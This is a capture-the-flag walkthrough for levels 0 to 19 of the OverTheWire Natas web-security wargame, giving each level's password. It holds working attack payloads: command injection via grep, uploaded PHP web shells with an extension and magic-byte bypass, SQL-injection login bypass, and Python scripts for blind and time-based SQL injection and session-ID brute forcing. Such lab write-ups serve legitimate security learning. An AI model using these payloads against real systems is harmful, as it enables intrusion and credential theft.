<div align="center">
  <h1>Natas</h1>
</div>

# Natas 0 

Simple Inspect Element of the page will reveal the password in the comment of the HTML.

natas1: `g9D9cREhslqBKtcA2uocGHPfMZVzeFK6`

# Natas 1

Instead of right-clicking, one can invoke Inspect Element by using the keyboard combination `Ctrl + Shift + I`. Password again will be in the comment of the HTML.

natas2: `h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7`

# Natas 2

Viewing the page source, there is indeed nothing on the page itself. However, there is a image with the path of `files/pixel.png` displayed on the page. 

We inspect `files` directory by going to `http://natas2.natas.labs.overthewire.org/files/`. In here we can see two files, `pixel.png` from the page and a new file `user.txt`. Opening `user.txt` should give us the password for the user `natas3` for the next level. 

natas3: `G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q`

# Natas 3

Viewing the source of the web page, again, there is indeed nothing. But there is a very interesting comment: `No more information leaks!! Not even Google will find it this time...`. This implies that Google crawler will not touch whatever the so-called "information leaks". 

We can think of `robots.txt` in this case. A `robots.txt` file tells search engine crawlers which URLs the crawler can access on your site. To disallow crawlers/bots accessing some sensitive data on your site, one can put there the disallowed lists of URLs on the page.

Accessing `robots.txt`, we found out that there is a interesting disallowed URL: `/s3cr3t`. Going to this URL, we can see that, again, there is a `user.txt` file there. Inside the `user.txt` is the password for the next stage.

natas4: `tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm`

# Natas 4

Solving this requires Burp Suite to modify the HTTP header in the request to the server.

Upon going to the webpage, we are greeted with the message of 

```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`
```

The page has a `Refresh page` link to click on. Clicking on that, the page rendered will have a different message: 
```
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/."
``` 
We are now at the `/index.php` page.

Clicking the button once more will display a different message 

```
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

Hence, there is something that has to do with the request that is invoked when we clicked on the `Refresh page` link. After refresh the page (not by using the link but the original link to `natas4`), we can see that every time we click on the `Refresh page`, the `Referer` field in the HTTP header changes, and what is in the `Referer` will be displayed on the web page. 

From the Mozilla docs, "The Referer HTTP request header contains an absolute or partial address of the page that makes the request. The Referer header allows a server to identify a page where people are visiting it from. This data can be used for analytics, logging, optimized caching, and more".

Therefore, to access the password, we need to change the `Referer` field to `http://natas5.natas.labs.overthewire.org/`. After doing it using the Intercept functionality in Burp Suite and forward the modified HTTP request, we can obtain the password. 

natas5: `Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD`

# Natas 5

We are not logged in. One way for web page to authenticate users (as HTTP is stateless) is by using cookies. Opening the Devtools from Chrome and navigate to the `Network` tab, then we refresh the page, we can observe that there is a cookie with the content of `loggedin=0` in the HTTP header. 

Hence, to authenticate, we have to change the value of the cookie from `0` to `1`. We can easily do this by using the `Application` tab, navigate to a dropdown named `Cookies`, then double click on the value `0`, change it to `1`. Refresh the web page and we should obtain the password.

natas6: `fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR`

# Natas 6

From the code, we can observe that the secret is loaded from the resource located at `includes/secret.inc`. Going to that resource will give us the secret. Key in the secret and we should get the password to the next stage

natas7: `jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr`

# Natas 7 

Clicking on the `Home` and `About`, we can see that the HTTP parameter `page` changes to whatever the value is there. Hence we can take advantage of this to read any file on the system. We have the hint (when we view the source of the web page) that the password is at `/etc/natas_webpass/natas8`. 

Key in that value into the `page` parameter, we should be able to retrieve the password. The URL to access the password will be `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

natas8: `a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB`

# Natas 8

Looking at the code, we have the encoded secret and how the secret is encoded. To get the secret, we unroll the encoding process. The string will first be converted to the `bin` format, then reverse, then decode from `Base64`. `Cyberchef` can easily help us here, with 3 layers being `From Hex`, `Reverse` and `From Base64`. The secret derived from the decoding is `oubWYf2kBq`.

Inputting the secret to the form should give us the password to the next level.

natas9: `Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd`

# Natas 9 

Our target is in the file at `/etc/natas_webpass/natas10`.

From the source code, the content in the form that we submitted is put into the command in the `passthru` call. 

The command that is executed on the server is `grep -i $key dictionary.txt`, where `$key` is the input that we submitted. We have total control on the content of the command pass to the `passthru` call. Hence, what we can do is to `grep` everything in the `/etc/natas_webpass/natas10` file, and disregard everything in the `dictionary.txt` file.

Inputting `.` to the `dictionary.txt` file, basically we are matching everything, we can see that there is nothing related to the password for the next level that is stored in here. Indeed, searching for any strings of length from 15 to 20 using `-x '.\{20,32\}'` does not yield anything really interesting. 

Hence, we can "escape" the call of `grep` on `dictionary` by doing `. /etc/natas_webpass/natas10; grep "!" `. This executes two commands, as the `;` is specified. First, it tries to do `grep -i . /etc/natas_webpass/natas10` - basically matching anything in the file. Then it tries to `grep` strings that contain `!` in it, and there are no such strings. The latter command is there to prevent the content of `dictionary.txt` clogging up the result. Inputting the payload, we should retrieve the password for the next level.

natas10: `D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE`

# Natas 10

Same idea, but this time we cannot use the `;` trick to make the result less clogged. `grep` does work on two files, and the filtering does not block the `/` character, hence we can just put `. /etc/natas_webpass/natas11 `. The `grep` command ran will match any character in both `/etc/natas_webpass/natas11` and `dictionary.txt`. 

The first entry of the result of this command should yield the password to the next level. Indeed, that is `/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg`.

natas11: `1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg`

# Natas 11

Viewing the source code, we can deduct a few things: 

- The `defaultData` is being encrypted with `xor` with a hard-coded key in the `xor_encrypt` function. The result of the encryption (as performed by the `saveData` function) will be stored in the cookie of the page.
- After the first load, cookies from the user will be checked in the `loadData` function. If the data can be decoded and decrypted, it will be stored into the local `data` variable. The data will be of the same structure as that of `defaultdata`. 
- If the `showpassword` field of the `data` array gives `"yes"`, then the password will be displayed to the current level's page.

The code for the operations mentioned below is the following:

```php
<?php
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    $modifieddata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
    $originalcookie = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=";

    function xor_encrypt($in, $key) {
        $text = $in;
        $outText = '';
    
        // Iterate through each character
        for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
        }
    
        return $outText;
    }

    function getKey($plain, $cipher) {
        $ciphertext = base64_decode($cipher);
        $plaintext = json_encode($plain);
        $key = xor_encrypt($ciphertext, $plaintext);
        return $key;
    }

    $key = getKey($defaultdata, $originalcookie);
    
    function generateValidPayload($d, $key) {
        $payload = base64_encode(xor_encrypt(json_encode($d), $key));
        return $payload;
    }
    var_dump($key);

    $new = generateValidPayload($modifieddata, "KNHL");
    
    echo $new;
?>
```

What we need to do is to craft a valid cookie value, such that when it is decoded and decrypted on the server side, it will generate an entry of `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")`. Note that `bgcolor` does not matter in the checking.

To figure out the key of the `xor` encryption, we can do the `xor` operation on the plaintext (the JSON encoded string of the `defaultdata`) and the ciphertext (the value of `"data"` in the cookie). This is because of the way `xor`, or one-time pad works: 

```
ciphertext = plaintext xor key
ciphertext xor plaintext = plaintext xor key xor plaintext
ciphertext xor plaintext = key
```

The key, after doing these operations, is `KNHL`. The key is repeated due to the way that the `xor` operation in the `xor_encrypt`, each 4 characters in the plaintext will be `xor`-ed with the key. Hence, in the result of the above code, you can see that the `KNHL` string is repeated multiple times.

With the key, we can easily generate the correct payload to retrieve the password. The target plaintext is the array `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")`. We follow the way that the original PHP code encode and encrypt the array to generate the payload. Changing the cookie value to the payload, then after submitted the form we can retrieve the flag.

Payload is `MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz`

natas12: `YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG`

# Natas 12

There is no checking in the source code that the uploaded file must be a JPEG file, hence we can upload any file that we want to the server. Since the backend is running on PHP, we might as well upload a PHP file to get the content of the file in `/etc/natas_webpass/natas13`. The file we will upload is the following:

```php
<?php
    passthru("cat /etc/natas_webpass/natas13")
?>
```

However, after uploading the file, the file name got changed to `<some_random_string>.jpg`, which disallows the PHP code from executing. Inspecting further, we can observe that there is a hidden `filename` (which determines the file name uploaded to the server), and it is already determined before any file is chosen. This `filename` is the path of the uploaded file on the web server.

Hence, if we can change the `filename` extension back to `.php`, we can make the PHP code valid and retrieve the flag. Opening the browser from Burp Suite, and then choose the PHP payload file and turn the Burp Suite intercept on, we can see the form data uploaded will be something like

```
------WebKitFormBoundaryEex9eRjYhKzAHvH7
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryEex9eRjYhKzAHvH7
Content-Disposition: form-data; name="filename"

j6s2vxhm9i.jpg
------WebKitFormBoundaryEex9eRjYhKzAHvH7
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.php"
Content-Type: application/octet-stream

<?php
    passthru("cat /etc/natas_webpass/natas13")
?>
------WebKitFormBoundaryEex9eRjYhKzAHvH7--
```

We change the `.jpg` filename to `natas12.php`, or any filename with the `.php` extension. Sent the changed POST request to the server, the path to the uploaded `.php` file should appear on the web page. Clicking on the link will lead to the result of executing `.php` file, which is the password of the next level.

natas13: `lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9`

# Natas 13

Same idea, but this time there is an additional check in `exif_imagetype`, which only reads the first bytes of a file to check its signature (or in other words, check the Magic Number of the file). We hence have to put the magic number of image files to the header of the PHP file. PHP file does not really complain if there is some text before the `php` code portion. 

We can pick `GIF`, it is a valid type for a image. GIF has the magic number, in ASCII of `GIF89a`. Put this before the `php` portion of the code and we should be able to bypass the check.

In particular, the file content will be like: 

```php
GIF89a
<?php
    passthru("cat /etc/natas_webpass/natas14")
?>
```

Again, turn on the Burp Suite browser and the Proxy Intercept function. Change the `filename` of the POST request form to anything ends with `.php`. An example, in the payload portion of the POST request, can be: 

```
------WebKitFormBoundarya8snrslosPiK9vI2
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundarya8snrslosPiK9vI2
Content-Disposition: form-data; name="filename"

9q708avz39.php
------WebKitFormBoundarya8snrslosPiK9vI2
Content-Disposition: form-data; name="uploadedfile"; filename="natas13.php"
Content-Type: application/octet-stream

GIF89a
<?php
    passthru("cat /etc/natas_webpass/natas13")
?>
------WebKitFormBoundarya8snrslosPiK9vI2--
```

Following the link to the uploaded resource, we can see the GIF magic number that we prepend to the PHP code and the result of the command in `passthru()`

natas14: `qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP`

# Natas 14

To get the password for the next level, the result of the query 
```sql
SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"
```
must return the result consisting of one or more lines (the check is at `mysqli_num_rows`). We obviously have no clue what is in the database, indeed any attempt in trying the `username` of `natas14` or `natas15` does not work.

This code is vulnerable to SQL injection, as we can directly manipulate the query to whatever we want. Also there is a debug function to help us out, by putting the URL parameter of `debug` in the POST request to the server. Submitting the form will do a POST request to the endpoint at `/index.php`. Hence, to enable the debug mode to see our command (which is very useful), we can use the intercept functionality, along with the in-app browser of Burp Suite to manipulate the URL parameter in the POST request to the backend.

We have no idea of the password in the database, hence we need a way to escape the query. Doing `"` at the beginning closes the first quotation mark in the `username` field. Of course no username matches `""` (empty string), hence we need a condition that is always True. Looking up on Google, we can see one common way is to put `or true` in the payload to make the result of the query always True. To escape all the conditions at the end of the query, again from simple Googling, we can use the comment in `mysql`: `--`. In MySQL, the `--`  (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on).

From all of the information above, our username field will be `" or true;-- ` (notice the space after the double-dash). The password field can be anything, due to the double dash `--` everything in the `password` comparison will be ignored anyways. I put `abcd` as the password. The query will become:

```sql
SELECT * from users where username="" or true;-- " and password="abcd"
```

Sending this using the in-app browser from Burp Suite, and change the POST endpoint to `/index.php`. The request will be something like 

```
POST /index.php?debug HTTP/1.1
Host: natas14.natas.labs.overthewire.org
Content-Length: 42
Cache-Control: max-age=0
Authorization: Basic bmF0YXMxNDpxUGF6U0pCbXJtVTdVUUp2MTdNSGsxUEdDNER4Wk1FUA==
Upgrade-Insecure-Requests: 1
Origin: http://natas14.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas14.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=%22+or+true%3B--+++&password=abcd
```

We should get the password after forwarding this POST request, and also see the SQL command being executed.

natas15: `TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB`

# Natas 15

Tough challenge, but simple concept. This is an example (sort) of Blind SQL injection. 

For a query, the PHP backend returns `"This user exists."` if the result of the query has more than 0 rows, otherwise it returns `"This user doesn't exist.`. There is no additional information to retrieve the password, and the only interaction we are allowed is on the SQL database, therefore we can assume that the password for the next level exists in the SQL database.

Putting `natas16` as the first username, we are informed that the user `natas16` indeed exists. We now need a way to make the query result "leak" something about the password. We have free rein on controlling the input, or the query itself, hence we can make more specific queries involving the password.

Since we do not know the password, we can start guessing letter by letter. We can employ the `%` symbol in MySQL. For instance, `abcd%` will match any strings start with `abcd`. Using this, the username field we submitted will look something like `natas16" and password like binary abcd%`. `binary` in MySQL means that the strings matched will be case-sensitive (this is needed as the password is a mix of lowercase and uppercase characters). The query in the PHP backend will look something like

```sql
SELECT * from users where username="natas16" and password like binary "abcd%";
```

Initially, we know nothing about the password, hence we start from `<guess_char>%`. `guess_char` is the character we are guessing in the first position, the guess space is all the alphanumeric characters. The correct guess will return the response of `"This user exists."`. Let's say the character in the first position of the password is `T`, the next guess of the password is going to be `T<guess_char>%`. We will repeat this procedure until the length of the string preceding the `%` sign is equal to 32 (the size of all the password in all of the levels). 

To make the process less tedious, we can use the Intruder functionality from Burp Suite, but unfortunately Burp Suite has very silly rate limiting and throttling if you did not purchase a license. OWASP Zap is another candidate, but again, unfortunately the process of guessing on OWASP Zap using the Fuzz functionality is very tedious with 32 character strings. Therefore, to generate the guess fast and smartly, we can employ Python `requests` library to do the job.

As brute-forcing the entire set of alphanumeric characters for every position in the password string takes considerable time (lots of overhead with establishing connection with challenge server), we can narrow down the search space by only searching on the set of characters that actually appear in the password. We can use the double `%` in MySQL to do the work. `%a%` matches any string that contains the letter `a`. Hence, we can traverse through the list of all alphanumeric characters, and check whether it exists in the password of the user `natas16`. The SQL query to check if the character `T` exists in the password will look like this, note that `binary` is also used to respect the case-sensitiveness of the password:

```sql
SELECT * from users where username="natas16" and password like binary "%T%"
```

The username field will look something like `natas16" and password like binary %T%`. After generating the trimmed down character set, we can proceed to guessing the character in every position of the password with the idea given above. 

The code for all of the aforementioned operation:

```python
import string 
import requests 

alphanumeric = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
charset = ""
password = ""
target = 'http://natas15.natas.labs.overthewire.org'

# Generating the charset for the brute forcing
for char in alphanumeric:
    username = 'natas16" and password like binary "%' + char + '%'
    r = requests.get(target, 
        auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
        params={"username": username}
        )
    if "This user exists" in r.text:
        charset += char

print("The charset used is: " + charset)

# Guessing every position in the password string 
# As the type of password is varchar(64), just to be safe the loop runs 64 times for 64 possible positions
for i in range(64):
    for char in charset:
        guess = password + char
        username = 'natas16" and password like binary "' + guess + '%'
        r = requests.get(target, 
            auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
            params={"username": username}
            )
        if "This user exists" in r.text:
            password += char 
            print("Iteration " + str(i + 1) + ": " + guess)
            break 
    
    # No more addition of characters is possible, 
    # hence the password we have is indeed the password for this level
    print("The final password is: " + password)
    break 
```

natas16: `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`

# Natas 16

Same idea as above, we will try to leak the password character by character. But the trick used here is "disgustingly" neat. 

The challenge basically blocks any attempt in escaping the double quotation marks `"`, so we can't make any attempt in leaking the entire flag in the result in the clear. We need a roundabout way to leak the flag. The filter does not filter out some symbols, in particular `$`, `(`, `)`, and `/`. 

We can load the content of a command into the double quotes `"`, in particular something like `cat /etc/natas_webpass/natas17` by doing `$(cat /etc/natas_webpass/natas17)` - the content of the password will be included in the `" "`.

But obviously getting the content of the `natas17` loaded into the `" "` of the `grep` command in `passthru` does not help us with anything - as the password is not even in the `dictionary.txt` file. We need a way to indirectly leak the content of the password stored at `/etc/natas_webpass/natas17`.

A really smart idea is to include the `grep` command in the content of the `" "`. In particular, `grep` will return the content, or part of the content of the password file if some pattern that we specify exists. Hence, we can input something like 

```bash
lunar$(grep -E ^abcd /etc/natas_webpass/natas17)
```

What this basically does is if the `grep` command returns something - let say it returns `abcd`, then the output observed on the website page is nothing (as no word in the `dictionary.txt` is `lunarabcd`). If the `grep` returns nothing, then the string that is `grep`-ed in the `grep` command in `passthru` is `lunar` - it exists in the dictionary so the output of `lunar` should be on the web page. The `-E` tag indicate that we are using a Regular Expression, and `^abcd` means that we are checking if the string in `/etc/natas_webpass/natas17` starts with `abcd`.

Hence, we are able to guess the password character by character by adding more characters to the string after the `^`. Again, we can reduce the search space by searching for all the characters that appear in the password.

The code for all of the aforementioned operation:

```python
import string 
import requests

target = 'http://natas16.natas.labs.overthewire.org'
creds = ('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')

alphanumeric = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
charset = ""
password = ""

# Generating the charset for the brute forcing (or guessing char by char)
for char in alphanumeric:
    payload = 'lunar' + '$(grep ' + char + ' /etc/natas_webpass/natas17)'
    r = requests.get(target, auth = creds, params = {"needle": payload})
    if "lunar" not in r.text:
        charset += char 

print("The charset used is: " + charset)

print("--------- Guessing char by char ---------")
# Guessing every position in the password string 
# As the password is 32 chars long, the loop only runs 32 times
for i in range(32):
    for char in charset: 
        guess = password + char
        payload = 'lunar' + '$(grep ^' + guess + ' /etc/natas_webpass/natas17)'
        r = requests.get(target, auth = creds, params = {"needle": payload})
        if "lunar" not in r.text:
            password += char
            print(guess.ljust(32, '='))
            break

```

natas17: `XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd`

# Natas 17

One word, painful.

This is the same idea as `natas15`, but this time the result of the query is not displayed to the web page (all the `echo` call are commented out). We need a way to make the query leak information similar to the message of `"This user exists."` in `natas15`.

We can achieve this by doing a time-based SQL injection. This means that we insert a `sleep` call to the SQL query. The query will look something like this:

```sql
SELECT * from users where username="natas18" and password like binary "abcd%" and sleep(5);-- "
```

We add in `sleep(5)` to our SQL query. When there exists a username of `natas18` (which you can verify by removing the `password` checking portion) and the password indeed starts with `abcd`, the query will sleep for 5 seconds. If any of the conditions in the query is wrong, the `sleep(5)` will not be executed, therefore the query will run in a much shorter amount of time. This can be leveraged to guess the password character by character, same as the idea from `natas15`. A Python script can check if the response time of the query is longer than some arbitrary amount. If the time of a certain query is indeed longer, we know for a fact that the characters we are guessing are correct.

We can reuse the same trick in `natas15` to narrow down the character set we need to guess. The SQL query for this should look something like:

```sql
SELECT * from users where username="natas16" and password like binary "%T%" and sleep(5); --"
```

This time, as the gimmick is to use the response time, sometimes the server might not respond quickly or there is congestion in the network, so setting the `sleep` time to be larger will help account for such issues. This can be painful, as setting the time too high will make the solving time really slow, but if we set the `sleep` time too short, the chances of time-related issues will be much higher. 

For me, as I was having some problems with getting the correct guessing character set, so I set the `sleep` time to be 5 seconds, to be extra safe. The guessing part I set the `sleep` time to be 1 second, as setting it too high will waste too much of my time. 

The code for all of the aforementioned operations: 

```python
import string 
import requests

target = 'http://natas17.natas.labs.overthewire.org'
creds = ('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')

alphanumeric = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
charset = ""
password = ""

# Guessing the charset, make the sleep time as long as possible to account for 
# some disruptions in the network
for char in alphanumeric:
    payload = 'natas18" and password like binary "%' + char + '%"' + ' and sleep(5);-- '
    r = requests.get(target, auth = creds, params = {"username": payload})
    
    print("Char: " + char + " - Time elapsed: " + str(r.elapsed.total_seconds()))
    if r.elapsed.total_seconds() > 3:
        charset += char 

print("The charset used is: " + charset)

# Guessing character by character, but this time we choose the character that
# results in the maximum amount of time. This is because during testing,
# some network issues happen and the code get the wrong results.
print("--------- Guessing char by char ---------")
for i in range(32):
    max_time = 0
    max_char = 'g'
    time = []
    for char in charset:
        guess = password + char
        payload = 'natas18" and password like binary "' + guess + '%"' + ' and sleep(1);-- '
        r = requests.get(target, auth = creds, params={"username": payload})
        time.append(r.elapsed.total_seconds())
        if r.elapsed.total_seconds() > max_time:
            max_char = char
            max_time = r.elapsed.total_seconds()
    
    password += max_char
    print("Iteration " + str(i + 1) + ": " + password.ljust(32, "="))
    print("Max time elapsed: ", max_time)
    print("Min time elapsed: ", min(time))
```

In the guessing character by character part, the script will print both the maximum and minimum response time. I find this to be very helpful, as when the guesses are all incorrect, or there are problems with the network, the maximum and minimum time are relatively close to each other. The `sleep` time might differ on another PC on a completely different network, so tune the numbers accordingly.

natas18: `8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`

# Natas 18

Some PHP facts regarding authentication from reading other writeups:

If someone is visiting a site for the very first time, the session in PHP works in some ways like this:

- The web server gets a request from the server and hands the request to the PHP backend
- `session_start()` is called, and it checks whether the user is logged in (PHP wraps the whole identification stuff). If there is no session ID in the request, or if some authentication information in the request (e.g `username`, `password`) is invalid, then a new session ID is generated. 
- PHP prepares the HTML output and hands to the server, including a instruction to set the cookie containing the newly generated session ID. This does not require the usual `set_cookie()` procedure. The browser will get the result and save the cookie.
- If some session ID already exists, then PHP looks for some saved location (sometimes `/tmp`) that is defined for serialized session data, then unserialize it and used to populate the `$_SESSION` superglobal.
- From now on with every subsequent request the browser sends its `PHPSESSIONID` stored in the cookie. `session_start()` picks up the session ID, look if the session ID exists, and if so, returns whatever is available to the session ID. 

Now, onto my take in solving the challenge. To retrieve the password, we must satisfy all the conditions in `print_credentials()`. There are three conditions: there must be a session, the session is storing some values for `"admin"`, and most importantly, the `$_SESSION["admin"]` must be equal to `1`. There is unfortunately nowhere in the code where we can hope to manipulate this value to 1. Any operation on `$_SESSION["admin"]` is always assigning the value to `0`. 

Hence, we need to find a way to take advantage of other weakness in the code. There are two `print_credentials()` call, one in the `if` branch and one in the `else` branch at the end.

```php
$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}
```
The `print_credentials()` in the `else` branch, will result in the "regular user" message, as the value of `$_SESSION["admin"]` is set to the result of `isValidAdminLogin()`, which always return 0. Hence, we must find a way to invoke the `print_credentials()` in the `if` branch, as there is no operation setting the `admin` value of the session to 0. Thus, we need to find a way to make `my_session_start()` return True.

```php
function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }
 
    return false;
}
```

Basically, three conditions are required. The `PHPSESSID` must be numerical, and valid (in the range of `1-640`). And here's a catch - there must be a `admin` key stored in the `$_SESSION` array (if there is not any, then the value of the `admin` key is set to `0`). Again, remember that the `session_start()` resumes the session, if the `PHPSESSID` is previously generated. Hence, we can make the assumption that there also exists a `PHPSESSID` for the `admin` as well (this really throws me off, as the code for explicitly assigning the `admin` key for the session of the `admin` is not explicitly written, perhaps it is somewhat hinted in the commented out part of `isValidAdminLogin()` - it could return `1` in the past).

Nonetheless, with these figured out, and the fact that the number of possible sessions IDs are `640` (defined in `$maxid`), we can do a brute-force search to find the session ID belonging to the `admin`, which should have the `admin` key of `1` in the `$_SESSION`. 

The code for all of the aforementioned operations: 

```python
import requests

target = 'http://natas18.natas.labs.overthewire.org'
auth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
params = dict(username='IceWizard4902', password='ISuck@CTF') # not needed
cookies = dict()

for i in range(1, 641):
    print("Trying with PHPID: ", i)
    cookies = dict(PHPSESSID=str(i))
    r = requests.get(target, auth = auth, cookies = cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break 


```

We do not really need to include the `username` and `password` in the `GET` request that we sent, as the `if` condition does not really care if the credentials are there, only when it reaches the `else` branch that it starts to do some checks on the parameters passed into the `GET` request.

natas19: `8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s`

# Natas 19

One mental note: When it comes to PHP cookies that has some numbers and letters in it, going to `Cyberchef` and check if the content is encoded is a good practice. 

We are given that the code is the same, but this time the session IDs are not "sequential". What does this even mean??? - the way to generate the session IDs from the old code is not relying on any "sequential" order, indeed they are generated randomly in the range of `1-640`. 

After typing in some dummy data for username and password, inspecting the `PHPSESSID` we see some hex strings like `3530362d6168646864`, which in my case for the username of `ahdhd`, after decoding, it gives `506-ahdhd`. Repeating this process for another username, we can see that the structure of the session ID before encoding is `<NUMBER IN RANGE 1 - 640>-<USERNAME>`. Hence, the correct `PHPSESSID` for the `admin`, before hex encoded, should be something of the form `<NUMBER IN RANGE 1 - 640>-admin`.

The code for all of the aforementioned operations: 

```python
import requests

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
params = dict(username='IceWizard4902', password='ISuck@CTF') # not needed
cookies = dict()

for i in range(1, 641):
    print("Trying with PHPID: ", i)
    PHPSESSID = (str(i) + "-admin").encode('utf-8').hex()
    cookies = dict(PHPSESSID=PHPSESSID)
    r = requests.get(target, auth = auth, cookies = cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break 
```

The hex encoding is done by a few Google searches, in particular one can do `"abc".encode('utf-8').hex()` to return the hex representation of the string `"abc"`. Otherwise, the idea is the same as the previous level - we brute-force every possible valid `PHPSESSID` until we received the password for the next level message.

natas20: `guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH`

# Natas 20

to be filled in later :)